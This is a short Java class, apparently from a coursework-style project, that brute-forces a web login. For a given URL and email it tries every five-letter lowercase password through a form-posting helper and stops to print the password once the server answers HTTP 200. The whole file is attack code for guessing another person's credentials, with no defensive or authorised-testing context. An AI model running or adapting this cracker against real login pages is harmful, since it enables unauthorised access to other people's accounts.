import java.io.IOException;

// import java.util.*;


public class BruteForce implements Cracker{

    BruteForce(){
        
    }

    @Override
    public void hack(String url, String email ) {
        HttpClientPostForm http = new HttpClientPostForm();
        char[] charset = "abcdefghijklmnopqrstuvwxyz".toCharArray();
        String tentative = new String();
        long start = System.currentTimeMillis();
        outerloop: for (int i = 0; i < charset.length; i++) {
            for (int j = 0; j < charset.length; j++) {
                for (int j2 = 0; j2 < charset.length; j2++) {
                    for (int k = 0; k < charset.length; k++) {
                        for (int k2 = 0; k2 < charset.length; k2++) {
                            tentative = "" + charset[i] + charset[j] + charset[j2] + charset[k] + charset[k2];

                            System.out.println(tentative);
                            try {
                                if(http.getPassword(url, email, tentative)==200) {
                                    System.out.println("\nmot de passe trouvé : " +tentative);
                                    long end = System.currentTimeMillis();
                                    System.out.println("\ntemps:" + (end - start) / 1000+"s\n");
                                    break outerloop;
                                } 
                                else {
                                    tentative = "";
                                }
                            } catch (IOException e) {
                                
                                e.printStackTrace();
                            } catch (InterruptedException e) {
                                
                                
                                e.printStackTrace();
                            }

                        }
                    }
                }
            }
        }
    }
}